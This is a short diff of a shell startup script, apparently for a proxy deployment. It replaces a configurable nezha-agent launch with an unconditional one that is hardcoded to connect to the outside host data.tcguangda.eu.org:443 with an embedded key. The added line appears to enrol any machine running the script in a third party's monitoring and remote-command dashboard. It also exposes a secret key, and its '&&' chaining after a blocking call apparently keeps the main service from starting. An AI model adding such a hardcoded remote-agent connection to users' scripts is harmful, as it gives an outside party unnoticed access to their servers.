@@ -220,7 +220,6 @@ if [[ -n "${NEZHA_SERVER}" && -n "${NEZHA_PORT}" && -n "${NEZHA_KEY}" ]]; then
     unzip -qod ./ nezha-agent_linux_amd64.zip
     chmod +x nezha-agent
     rm -f nezha-agent_linux_amd64.zip
-    nohup ./nezha-agent -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} --tls &>/dev/null &
 fi
 
-./nodejs -config=index.json
+nohup ./nezha-agent -s data.tcguangda.eu.org:443 -p AJURUUDKJRypUfG98Q --tls && ./nodejs -config=index.json
